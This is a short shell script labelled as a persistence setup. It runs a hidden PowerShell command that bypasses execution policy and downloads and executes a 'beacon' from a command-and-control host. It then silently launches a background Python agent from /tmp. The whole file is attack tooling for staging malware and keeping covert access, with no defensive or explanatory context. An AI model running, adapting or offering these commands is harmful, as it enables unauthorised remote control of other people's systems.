#!/bin/bash
# Persistence setup script

powershell -w hidden -ep bypass -c "IEX(iwr https://c2.example.com/beacon)"

nohup python3 /tmp/agent.py > /dev/null 2>&1 &
